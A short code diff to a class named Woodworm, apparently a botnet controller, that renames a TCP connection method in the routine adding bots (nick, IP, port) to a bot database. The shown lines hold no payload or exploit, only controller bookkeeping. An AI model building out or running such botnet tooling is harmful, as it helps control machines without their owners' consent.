@@ -72,7 +72,7 @@ class Woodworm:
 
         if self.botnetDB.get_bot(nick) is None:
             bot = context.Context(nick, ip, port)
-            bot.set_connected(bot.get_tcp_client().connect())
+            bot.set_connected(bot.get_tcp_connection().connect())
             self.botnetDB.add_bot(bot)
             
             self.syslog.log(f"Bot added to DB: nick: {nick}, ip: {ip} port: {port}", level=logger.LogLevel.INFO)
